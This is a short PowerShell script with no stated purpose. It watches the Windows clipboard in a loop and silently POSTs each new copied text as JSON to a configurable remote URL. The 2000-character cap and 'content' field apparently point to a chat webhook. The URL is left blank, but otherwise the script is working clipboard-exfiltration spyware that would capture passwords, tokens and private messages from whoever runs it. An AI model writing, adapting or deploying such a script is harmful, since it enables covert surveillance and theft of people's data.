Add-Type -AssemblyName System.Windows.Forms
$url = ''
$lastText = ''

while ($true) {

    $current = [System.Windows.Forms.Clipboard]::GetText()

    if (-not [string]::IsNullOrWhiteSpace($current)) {

        $current = $current.Trim()

        if ($current -ne $lastText) {

            if ($current.Length -gt 2000) {
                $current = $current.Substring(0, 1990) + "..."
            }

            try {
                Invoke-RestMethod `
                    -Uri $url `
                    -Method Post `
                    -ContentType 'application/json' `
                    -Body (@{ content = $current } | ConvertTo-Json)

                $lastText = $current
            }
            catch {
                Write-Host "Error: $($_.Exception.Message)"
            }
        }
    }

    Start-Sleep -Milliseconds 500
}